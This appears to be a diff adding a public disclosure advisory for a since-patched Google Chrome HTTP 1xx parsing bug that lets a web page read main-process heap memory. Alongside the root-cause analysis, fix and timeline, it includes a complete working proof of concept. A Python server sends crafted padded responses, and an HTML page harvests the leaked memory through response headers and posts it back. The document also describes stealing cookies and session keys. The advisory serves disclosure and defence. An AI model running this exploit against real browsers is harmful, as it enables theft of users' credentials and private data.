@@ -1,0 +1,308 @@
+'''
+
+Source: http://blog.skylined.nl/20161219001.html
+
+Synopsis
+
+A specially crafted HTTP response can allow a malicious web-page to trigger a out-of-bounds read vulnerability in Google Chrome. The data is read from the main process' memory.
+
+Known affected software, attack vectors and potential mitigations
+
+Google Chrome up to, but not including, 31.0.1650.48
+
+An attacker would need to get a target user to open a specially crafted web-page. Disabling Java­Script does not prevent an attacker from triggering the vulnerable code path, but may prevent exfiltration of information.
+Since the affected code has not been changed since 2009, I assume this affects all versions of Chrome released in the last few years.
+
+Details
+
+The Http­Stream­Parser class is used to send HTTP requests and receive HTTP responses. Its read_­buf_ member is a buffer used to store HTTP response data received from the server. Parts of the code are written under the assumption that the response currently being parsed is always stored at the start of this buffer (as returned by read_­buf_->Start­Of­Buffer()), other parts take into account that this may not be the case (read_­buf_->Start­Of­Buffer() + read_­buf_­unused_­offset_). In most cases, responses are removed from the buffer once they have been parsed and any superfluous data is moved to the beginning of the buffer, to be treated as part of the next response. However, the code special cases HTTP 1xx replies and returns a result without removing the request from the buffer. This means that the response to the next request will not be stored at the start of the buffer, but after this HTTP 1xx response and read_­buf_­unused_­offset_ should be used to find where it starts.
+
+The code that special cases HTTP 1xx responses is:
+
+  if (end_­of_­header_­offset == -1) {
+<<<snip>>>
+  } else {
+    // Note where the headers stop.
+    read_­buf_­unused_­offset_ = end_­of_­header_­offset;
+
+    if (response_->headers->response_­code() / 100 == 1) {
+      // After processing a 1xx response, the caller will ask for the next
+      // header, so reset state to support that.  We don't just skip these
+      // completely because 1xx codes aren't acceptable when establishing a
+      // tunnel.
+      io_­state_ = STATE_­REQUEST_­SENT;
+      response_­header_­start_­offset_ = -1;
+<<<Note: the code above does not remove the HTTP 1xx response from the
+         buffer.>>>
+    } else {
+<<<Note: the code that follows either removes the response from the buffer
+         immediately, or expects it to be removed in a call to
+         Read­Response­Body later.>>>
+<<<snip>>>
+  return result;
+}
+
+A look through the code has revealed one location where this can lead to a security issue (also in Do­Read­Headers­Complete). The code uses an offset from the start of the buffer (rather than the start of the current responses) to pass as an argument to a Do­Parse­Response­Headers.
+
+  if (result == ERR_­CONNECTION_­CLOSED) {
+<<<snip>>>
+    // Parse things as well as we can and let the caller decide what to do.
+    int end_­offset;
+    if (response_­header_­start_­offset_ >= 0) {
+      io_­state_ = STATE_­READ_­BODY_­COMPLETE;
+      end_­offset = read_­buf_->offset();
+<<<Note: "end_­offset" is relative to the start of the buffer>>>
+    } else {
+      io_­state_ = STATE_­BODY_­PENDING;
+      end_­offset = 0;
+<<<Note: "end_­offset" is relative to the start of the current response
+         i.e. start + read_­buf_­unused_­offset_.>>>
+    }
+    int rv = Do­Parse­Response­Headers(end_­offset);
+<<<snip>>>
+Do­Parse­Response­Headers passes the argument unchanged to Http­Util::Assemble­Raw­Headers:
+
+int Http­Stream­Parser::Do­Parse­Response­Headers(int end_­offset) {
+  scoped_­refptr<Http­Response­Headers> headers;
+  if (response_­header_­start_­offset_ >= 0) {
+    headers = new Http­Response­Headers(Http­Util::Assemble­Raw­Headers(
+        read_­buf_->Start­Of­Buffer() + read_­buf_­unused_­offset_, end_­offset));
+<<<snip>>>
+
+The Http­Util::Assemble­Raw­Headers method takes two arguments: a pointer to a buffer, and the length of the buffer. The pointer is calculated correctly (in Do­Parse­Response­Headers) and points to the start of the current response. The length is the offset that was calculated incorrectly in Do­Read­Headers­Complete. If the current response is preceded by a HTTP 1xx response in the buffer, this length is larger than it should be: the calculated value will be the correct length plus the size of the previous HTTP 1xx response (read_­buf_­unused_­offset_).
+
+std::string Http­Util::Assemble­Raw­Headers(const char* input_­begin,
+                                         int input_­len) {
+  std::string raw_­headers;
+  raw_­headers.reserve(input_­len);
+
+  const char* input_­end = input_­begin + input_­len;
+input_­begin was calculated as read_­buf_->Start­Of­Buffer() + read_­buf_­unused_­offset_,
+input_­len was incorrectly calculated as len(headers) + read_­buf_­unused_­offset_,
+input_­end will be read_­buf_->Start­Of­Buffer() + 2 * read_­buf_­unused_­offset_ + len(headers)
+input_­end is now beyond the end of the actual headers. The code will continue to rely on this incorrect value to try to create a copy of the headers, inadvertently making a copy of data that is not part of this response and may not even be part of the read_­buf_ buffer. This could cause the code to copy data from memory that is stored immediately after read_­buf_ into a string that represents the response headers. This string is passed to the renderer process that made the request, allowing a web-page inside the sandbox to read memory from the main process' heap.
+
+An ASCII diagram might be useful to illustrate what is going on:
+
+read_­buf_:                      "HTTP 100 Continue\r\n...HTTP XXX Current response\r\n...Unused..."
+read_­buf_->Start­Of­Buffer()  -----^
+read_­buf_->capacity()  ----------[================================================================]
+read_­buf_->offset()  ------------[=======================================================]
+read_­buf_­unused_­offset_   -------[=======================]
+
+Do­Read­Headers­Complete/Do­Parse­Response­Headers:
+end_­offset  ---------------------[=======================================================]
+
+Assemble­Raw­Headers:
+input_­begin ---------------------------------------------^
+input_­len  ----------------------------------------------[========================================###############]
+error in input_­len value   --------------------------------------------------------------[========###############]
+  (== read_­buf_­unused_­offset_)
+Memory read from the main process' heap  ---------------------------------------------------------[##############]
+
+Repro
+
+The below proof-of-concept consist of a server that hosts a simple web-page. This web-page uses XMLHttp­Request to make requests to the server. The server responds with a carefully crafted reply to exploit the vulnerability and leak data from the main process' memory in the HTTP headers of the response. The web-page then uses get­All­Response­Headers() to read the leaked data, and posts it to the server, which displays the memory. The Po­C makes no attempt to influence the layout of the main process' memory, so arbitrary data will be shown and access violation may occur which crash Chrome. With the Po­C loaded in one tab, simply browsing the internet in another might show some leaked information from the pages you visit.
+
+Po­C.py:
+'''
+
+import Base­HTTPServer, json, sys, socket;
+
+def sploit(o­HTTPServer, s­Body):
+  i­Read­Size = 2048;
+  # The size of the HTTP 1xx response determines how many bytes can be read beyond the next response.
+  # This HTTP 1xx response is padded to allow reading the desired amount of bytes:
+  s­First­Response = pad("HTTP/1.1 100 %s\r\n\r\n", i­Read­Size);
+  o­HTTPServer.wfile.write(s­First­Response);
+  # The size of the second response determines where in the buffer reading of data beyond the response starts.
+  # For a new connection, the buffer start empty and grows in 4K increments. If the HTTP 1xx response and the second
+  # response have a combined size of less then 4K, the buffer will be 4K in size. If the second response is padded
+  # correctly, the first byte read beyond it will be the first byte beyond the buffer, which increases the chance of
+  # reading something useful.
+  s­Second­Response = pad("HTTP/1.1 200 %s\r\nx: x", 4 * 1024 - 1 - len(s­First­Response));
+  o­HTTPServer.wfile.write(s­Second­Response);
+  o­HTTPServer.wfile.close();
+  
+  if s­Body:
+    s­Leaked­Memory = json.loads(s­Body);
+    assert s­Leaked­Memory.endswith("\r\n"), \
+        "Expected CRLF is missing: %s" % repr(s­Leaked­Memory);
+    as­Leaked­Memory­Chunks = s­Leaked­Memory[:-2].split("\r\n");
+    s­First­Chunk = None;
+    for s­Leaked­Memory­Chunk in as­Leaked­Memory­Chunks:
+      if s­Leaked­Memory­Chunk.startswith("x: x"):
+        s­First­Chunk = s­Leaked­Memory­Chunk[4:];
+        if s­First­Chunk:
+          dump(s­First­Chunk);
+        as­Leaked­Memory­Chunks.remove(s­Leaked­Memory­Chunk);
+        if len(as­Leaked­Memory­Chunks) == 1:
+          print "A CR/LF/CRLF separates the above memory chunk from the below chunk:";
+        elif len(as­Leaked­Memory­Chunks) > 1:
+          print "A CR/LF/CRLF separates the above memory chunk from the below chunks, their original order is unknown:";
+        for s­Leaked­Memory­Chunk in as­Leaked­Memory­Chunks:
+          dump(s­Leaked­Memory­Chunk);
+        break;
+    else:
+      dump(s­Leaked­Memory);
+
+class Request­Handler(Base­HTTPServer.Base­HTTPRequest­Handler):
+  def handle_­one_­request(self, *tx­Args, **dx­Args):
+    try:
+      return Base­HTTPServer.Base­HTTPRequest­Handler.handle_­one_­request(self, *tx­Args, **dx­Args);
+    except socket.error:
+      pass;
+  def do_­GET(self):
+    self.do_­GET_­or_­POST();
+  def do_­POST(self):
+    self.do_­GET_­or_­POST();
+    
+  def __send­File­Response(self, i­Code, s­File­Path):
+      try:
+        o­File = open(s­File­Path, "rb");
+        s­Content = o­File.read();
+        o­File.close();
+      except:
+        self.__send­Response(500, "Cannot find %s" % s­File­Path);
+      else:
+        self.__send­Response(i­Code, s­Content);
+  def __send­Response(self, i­Code, s­Content):
+    self.send_­response(i­Code);
+    self.send_­header("accept-ranges", "bytes");
+    self.send_­header("cache-control", "no-cache, must-revalidate");
+    self.send_­header("content-length", str(len(s­Content)));
+    self.send_­header("content-type", "text/html");
+    self.send_­header("date", "Sat Aug 28 1976 09:15:00 GMT");
+    self.send_­header("expires", "Sat Aug 28 1976 09:15:00 GMT");
+    self.send_­header("pragma", "no-cache");
+    self.end_­headers();
+    self.wfile.write(s­Content);
+    self.wfile.close();
+
+  def do_­GET_­or_­POST(self):
+    try:
+      try:
+        i­Content­Length = int(self.headers.getheader("content-length"));
+      except:
+        s­Body = "";
+      else:
+        s­Body = self.rfile.read(i­Content­Length);
+      if self.path in gds­Files:
+        return self.__send­File­Response(200, gds­Files[self.path]);
+      elif self.path in gds­Functions:
+        return gds­Functions[self.path](self, s­Body);
+      else:
+        return self.__send­Response(404, "Not found");
+    except:
+      self.server.server_­close();
+      raise;
+
+def pad(s­Template, i­Size):
+  i­Padding = i­Size - len(s­Template % "");
+  return s­Template % (i­Padding * "A");
+
+def dump(s­Memory):
+  as­DWords = []; i­DWord = 0; as­Bytes = []; as­Chars = [];
+  print "-%s-.-%s-.-%s" % (
+      ("%d DWORDS" % (len(s­Memory) >> 2)).center(35, "-"),
+      ("%d BYTES" % len(s­Memory)).center(47, "-"),
+      "ASCII".center(16, "-"));
+  for i­Index in xrange(len(s­Memory)):
+    s­Byte = s­Memory[i­Index];
+    i­Byte = ord(s­Byte);
+    as­Chars.append(0x1f < i­Byte < 0x80 and s­Byte or ".");
+    as­Bytes.append("%02X" % i­Byte);
+    i­Bit­Offset = (i­Index % 4) * 8;
+    i­DWord += i­Byte << i­Bit­Offset;
+    if i­Bit­Offset == 24 or (i­Index == len(s­Memory) - 1):
+      as­DWords.append({
+        0: "      %02X",
+        8: "    %04X",
+        16:"  %06X",
+        24:"%08X"
+      }[i­Bit­Offset] % i­DWord);
+      i­DWord = 0;
+    if (i­Index % 16 == 15) or (i­Index == len(s­Memory) - 1):
+      print " %-35s | %-47s | %s" % (" ".join(as­DWords), " ".join(as­Bytes), "".join(as­Chars));
+      as­DWords = []; as­Bytes = []; as­Chars = [];
+
+if __name__ == "__main__":
+  gds­Files = {
+    "/": "proxy.html",
+  }
+  gds­Functions = {
+    "/sploit": sploit,
+  }
+  tx­Address = ("localhost", 28876);
+  o­HTTPServer = Base­HTTPServer.HTTPServer(tx­Address, Request­Handler);
+  print "Serving at: http://%s:%d" % tx­Address;
+  try:
+    o­HTTPServer.serve_­forever();
+  except Keyboard­Interrupt:
+    pass;
+  o­HTTPServer.server_­close();
+
+'''
+Proxy.html:
+
+<!doctype html>
+<html>
+  <head>
+    <script>
+      var i­Threads = 1;    // number of simultanious request "threads", higher = faster extraction of data
+      var i­Delay = 1000;   // delay between requests in each "thread", lower = faster extraction of data
+      function request­Loop(s­Data­To­Send) {
+        var o­XMLHttp­Request = new XMLHttp­Request();
+        o­XMLHttp­Request.open("POST", "/sploit", true);
+        o­XMLHttp­Request.onreadystatechange = function () {
+          if (o­XMLHttp­Request.ready­State === 4) {
+            if (o­XMLHttp­Request.status == 200) {
+              var s­Headers = o­XMLHttp­Request.get­All­Response­Headers();
+              console.log("response =" + o­XMLHttp­Request.status + " " + o­XMLHttp­Request.status­Text);
+              console.log("headers  =" + s­Headers.length + ":[" + s­Headers + "]");
+              if (i­Delay > 0) {
+                set­Timeout(function() {
+                  request­Loop(s­Headers);
+                }, i­Delay);
+              } else {
+                request­Loop(s­Headers);
+              }
+            } else {
+              document.write("Server failed!");
+            }
+          }
+        }
+        o­XMLHttp­Request.send(s­Data­To­Send ? JSON.stringify(s­Data­To­Send) : "");
+      }
+      window.add­Event­Listener("load", function () {
+        for (var i = 0; i < i­Threads; i++) request­Loop("");
+      }, true);
+    </script>
+  </head>
+  <body>
+  </body>
+</html>
+
+Exploit
+
+The impact depends on what happens to be stored on the heap immediately following the buffer. Since a web-page can influence the activities of the main process (e.g. it can ask it to make other HTTP requests), a certain amount of control over the heap layout is possible. An attacker could attempt to create a "heap feng shui"-like attack where careful manipulation of the main process' activities allow reading of various types of information from the main process' heap. The most obvious targets that come to mind are http request/response data for different domains, such as log-in cookies, or session keys and function pointers that can be used to bypass ASLR/DEP. There are undoubtedly many other forms of interesting information that can be revealed in this way.
+
+There are little limits to the number of times an attacker can exploit this vulnerability, assuming the attacker can avoid triggering an access violation: if the buffer happens to be stored at the end of the heap, attempts to exploit this vulnerability could trigger an access violation/segmentation fault when the code attempts to read beyond the buffer from unallocated memory addresses.
+
+Fix
+
+I identified and tested two approaches to fixing this bug:
+
+- Fix the code where it relies on the response being stored at the start of the buffer.
+This addresses the incorrect addressing of memory that causes this vulnerability in various parts of the code. The design to keep HTTP 1xx responses in the buffer remains unchanged.
+- Remove HTTP 1xx responses from the buffer.
+There was inline documentation in the source that explained why HTTP 1xx responses were handled in a special way, but it didn't make much sense to me. This fix changes the design to no longer keep the HTTP 1xx response in the buffer. There is an added benefit to this fix in that it removes a potential Do­S attack, where a server responds with many large HTTP 1xx replies, all of which are kept in memory and eventually cause an OOM crash in the main process.
+The later fix was eventually implemented.
+
+Time-line
+
+27 September 2013: This vulnerability and two patches were submitted to the Chromium bugtracker.
+2 October 2013: A patch for this vulnerability was submitted by Google.
+12 November 2013: This vulnerability was address in version 31.0.1650.48.
+19 December 2016: Details of this vulnerability are released.
+'''
